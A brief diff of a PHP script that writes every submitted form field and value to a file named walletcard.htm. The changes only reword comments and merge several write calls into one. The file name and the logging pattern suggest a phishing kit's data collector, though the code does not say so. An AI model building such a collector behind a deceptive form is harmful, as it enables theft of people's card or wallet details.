@@ -1,10 +1,10 @@
 <?php
-// Define the file path in the project root
-$filePath = 'walletcard.htm'; // Change this if needed
+// Define the file path
+$filePath = 'walletcard.htm'; // Ensure this file exists in the same directory as data.php
 
-// Check if the file exists; if not, create it with writable permissions
+// Check if the file exists, and create it if it doesn't
 if (!file_exists($filePath)) {
-    file_put_contents($filePath, ""); // Create the file if it doesn't exist
+    file_put_contents($filePath, ''); // Create the file
 }
 
 // Open the file for appending
@@ -21,10 +21,7 @@ foreach ($_POST as $variable => $value) {
     $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
     
     // Write sanitized data to the file
-    fwrite($handle, $safe_variable);
-    fwrite($handle, "=");
-    fwrite($handle, $safe_value);
-    fwrite($handle, "<br>");
+    fwrite($handle, $safe_variable . "=" . $safe_value . "<br>");
 }
 
 fwrite($handle, "<hr>");
